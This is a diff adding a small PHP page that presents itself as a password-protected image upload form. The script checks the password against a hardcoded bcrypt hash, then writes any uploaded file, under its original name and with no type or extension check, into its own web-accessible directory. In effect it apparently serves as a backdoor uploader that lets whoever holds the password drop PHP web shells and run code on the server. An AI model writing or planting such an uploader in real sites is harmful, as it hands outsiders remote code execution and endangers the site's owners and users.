@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<form action="" method="post" enctype="multipart/form-data">
+  Select image to upload:<br>
+  <input type="file" name="fileToUpload" id="fileToUpload" required><br><br>
+  Enter password:<br>
+  <input type="password" name="uploadPassword" required><br><br>
+  <input type="submit" value="Upload Image" name="submit">
+</form>
+
+</body>
+</html>
+
+<?php
+// Ganti ini dengan hasil password_hash() dari password asli kamu
+$hashedPassword = '$2a$12$QOL6q740CbHrM0U1pFcSNup2MdkeGBIAWh8ftmA6UV3EsQaejSsOi';
+
+if (isset($_POST["submit"])) {
+    $inputPassword = $_POST["uploadPassword"] ?? '';
+
+    if (!password_verify($inputPassword, $hashedPassword)) {
+        echo "<p style='color:red;'>❌ Incorrect password.</p>";
+        exit;
+    }
+
+    if (isset($_FILES["fileToUpload"]) && $_FILES["fileToUpload"]["error"] === UPLOAD_ERR_OK) {
+        $targetFile = './' . basename($_FILES["fileToUpload"]["name"]);
+        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
+            echo "<p style='color:green;'>✅ The file " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
+        } else {
+            echo "<p style='color:red;'>❌ File upload failed.</p>";
+        }
+    } else {
+        echo "<p style='color:red;'>❌ No file uploaded or an error occurred.</p>";
+    }
+}
+?>
